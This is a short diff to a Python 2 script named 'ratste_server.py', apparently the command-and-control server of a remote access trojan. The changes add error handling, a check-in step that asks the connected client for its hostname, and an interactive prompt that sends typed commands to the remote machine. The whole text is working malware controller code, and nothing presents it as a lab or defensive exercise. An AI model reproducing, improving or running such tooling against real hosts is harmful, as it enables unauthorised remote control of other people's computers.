@@ -31,19 +31,30 @@ try:
     LHOST = str(sys.argv[1])
     LPORT = int(sys.argv[2])
 except:
-    print 'Usage: ./ratste_server.py <host> <port>'
+    print 'Usage: ./ratste_server.py <local_ip> <local_port>'
     sys.exit(1)
 
 def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((LHOST, LPORT))
-    s.listen(10)
-    print 'ratste server listening on {}:{}...'.format(LHOST, LPORT)
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((LHOST, LPORT))
+        s.listen(10)
+    except:
+        print 'ratste > network error, exiting...'
+        sys.exit(1)
+
+    print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
+    print 'ratste > type "quit" or ctrl-c to exit'
 
     conn, _ = s.accept()
 
+    conn.send('hostname')
+    client = conn.recv(4096).rstrip()
+    print 'ratste > check-in by {}'.format(client)
+
     while True:
-        cmd = raw_input('ratste > ').rstrip()
+        cmd = raw_input('ratste@{} > '.format(client)).rstrip()
 
         # allow noop
         if cmd == '':
